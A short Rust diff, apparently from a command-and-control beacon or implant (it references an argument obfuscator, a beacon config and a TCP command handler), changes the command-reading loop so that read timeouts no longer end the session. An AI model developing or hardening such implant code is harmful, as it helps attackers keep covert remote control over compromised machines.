@@ -24,7 +24,7 @@ mod argfuscator;
 
 #[cfg(target_os = "windows")]
 use std::ffi::CStr;
-use std::io::{BufRead, BufReader, Write};
+use std::io::{BufRead, BufReader, Write, ErrorKind};
 use std::net::TcpStream;
 use std::process::Command;
 use std::thread;
@@ -244,7 +244,17 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
                 }
                 buffer.clear();
             }
-            Err(_) => break,
+            Err(e) => {
+                // Si es timeout, simplemente continuar esperando comandos
+                // Esto previene reconexiones innecesarias cuando no hay actividad
+                if e.kind() == ErrorKind::TimedOut || e.kind() == ErrorKind::WouldBlock {
+                    debug_print!("DEBUG: Read timeout, continuando...");
+                    continue;
+                }
+                // Para otros errores (conexión cerrada, etc.), salir
+                debug_print!("DEBUG: Error de lectura: {}", e);
+                break;
+            }
         }
     }
 }
